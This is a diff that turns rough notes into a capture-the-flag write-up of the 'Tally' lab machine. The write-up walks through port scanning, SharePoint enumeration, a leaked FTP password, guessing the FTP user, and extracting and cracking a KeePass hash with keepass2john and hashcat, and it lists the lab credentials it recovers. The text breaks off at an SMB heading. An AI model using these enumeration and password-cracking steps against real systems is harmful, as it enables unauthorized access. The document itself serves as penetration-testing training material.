@@ -1,57 +1,112 @@
-**ROUGH WORK**
+# Tally
+#### 10.10.10.59
+###### Dotaplayer365
 
 
+```
+nmap 10.10.10.59
+
+PORT     STATE SERVICE
+21/tcp   open  ftp
+80/tcp   open  http
+81/tcp   open  hosts2-ns
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+808/tcp  open  ccproxy-http
+1433/tcp open  ms-sql-s
+```
 
 
-PORT      STATE SERVICE
-21/tcp    open  ftp
-80/tcp    open  http
-81/tcp    open  hosts2-ns
-135/tcp   open  msrpc
-139/tcp   open  netbios-ssn
-445/tcp   open  microsoft-ds
-808/tcp   open  ccproxy-http
-1433/tcp  open  ms-sql-s
-5985/tcp  open  wsman
-15567/tcp open  unknown
-32843/tcp open  unknown
-32844/tcp open  unknown
-32846/tcp open  unknown
-47001/tcp open  winrm
-49664/tcp open  unknown
-49665/tcp open  unknown
-49666/tcp open  unknown
-49667/tcp open  unknown
-49668/tcp open  unknown
-49669/tcp open  unknown
-49670/tcp open  unknown
+Checking the port 80 shows us that its a Sharepoint server.
+![Alt test](https://media.giphy.com/media/hKNPxrffFH0GY/giphy.gif "Website.png")
 
 
+When in Thermopylae call a SPartan
+Resource: http://github.com/sensepost/SPartan
+![Alt test](https://media.giphy.com/media/hKNPxrffFH0GY/giphy.gif "Spartan")
 
+One of the pages we find has something juicy!
+```
+...
+[+] [147][200][62875b] - http://10.10.10.59/Shared%20Documents/Forms/AllItems.aspx
+...
+```
+![Alt test](https://media.giphy.com/media/hKNPxrffFH0GY/giphy.gif "Allitems.png")
 
-=> http://github.com/sensepost/SPartan
-	pip install requests_ntlm
-	python SPartan.py -u http://tally.htb -sfcv
-
-=> http://tally.htb/Shared%20Documents/Forms/AllItems.aspx
-
+Lets download "ftp-details.docx and see what its got
+```
 FTP details
 hostname: tally
 workgroup: htb.local
 password: UTDRSCH53c"$6hys
 Please create your own user folder upon logging in
+```
 
-	ftp_user
-	UTDRSCH53c"$6hys
+Interesting
 
-=> Tim has keepass file 
-$keepass$*2*6000*222*f362b5565b916422607711b54e8d0bd20838f5111d33a5eed137f9d66a375efb*3f51c5ac43ad11e0096d59bb82a59dd09cfd8d2791cadbdb85ed3020d14c8fea*3f759d7011f43b30679a5ac650991caa*b45da6b5b0115c5a7fb688f8179a19a749338510dfe90aa5c2cb7ed37f992192*535a85ef5c9da14611ab1c1edc4f00a045840152975a4d277b3b5c4edc1cd7da
-CRACKED: simplementeyo
+Now we know the ftp password.
 
-=> KEEPASS DATA:
+We would just need to guess the ftp user
+
+My general guesses as always are (root, ftpuser, ftp_user, ftp-user, ftp, user and afcourse anonymous logins)
+
+You can call me a wordlist cause one of them worked!! :D
+
+FTP Username: ftp_user
+FTP Password: UTDRSCH53c"$6hys
+```
+ftp 10.10.10.59
+Name (10.10.10.59:root): ftp_user
+Password:
+230 User logged in.
+ftp> ls
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+08-31-17  10:51PM       <DIR>          From-Custodian
+12-08-17  09:01AM       <DIR>          Intranet
+08-28-17  05:56PM       <DIR>          Logs
+09-15-17  08:30PM       <DIR>          To-Upload
+09-17-17  08:27PM       <DIR>          User
+226 Transfer complete.
+```
+
+As we remember it was instructed that the person create his own folder when he logs in.
+
+So we go into Users and try searching for something nice
+
+Under /User/Tim/Files we find something Nice !!
+```
+ftp> ls
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+09-15-17  07:58PM                   17 bonus.txt
+09-15-17  08:24PM       <DIR>          KeePass-2.36
+09-15-17  08:22PM                 2222 tim.kdbx
+```
+
+Lets get brute forcing
+
+Create a hash using keepass2john
+```
+root@kali:~/Hackthebox/Tally# keepass2john tim.kdbx 
+tim:$keepass$*2*6000*222*f362b5565b916422607711b54e8d0bd20838f5111d33a5eed137f9d66a375efb*3f51c5ac43ad11e0096d59bb82a59dd09cfd8d2791cadbdb85ed3020d14c8fea*3f759d7011f43b30679a5ac650991caa*b45da6b5b0115c5a7fb688f8179a19a749338510dfe90aa5c2cb7ed37f992192*85ef5c9da14611ab1c1edc4f00a045840152975a4d277b3b5c4edc1cd7da5f0f
+```
+
+Hashcat GG
+```
+.\hashcat64.exe -m 13400 .\hash.txt .\rockyou.txt  --show
+$keepass$*2*6000*222*f362b5565b916422607711b54e8d0bd20838f5111d33a5eed137f9d66a375efb*3f51c5ac43ad11e0096d59bb82a59dd09cfd8d2791cadbdb85ed3020d14c8fea*3f759d7011f43b30679a5ac650991caa*b45da6b5b0115c5a7fb688f8179a19a749338510dfe90aa5c2cb7ed37f992192*85ef5c9da14611ab1c1edc4f00a045840152975a4d277b3b5c4edc1cd7da5f0f:simplementeyo
+```
+Keepass Password: simplementeyo
+
+After opening the kdbx with the new password we get some data which looks like this
+```
 TALLY ACCT share : Finance : Acc0unting
 CISCO : cisco : cisco123
 PDF Writer : 64257-56525-54257-54734 : 
+```
+
 
 
 => SMB SHARE:
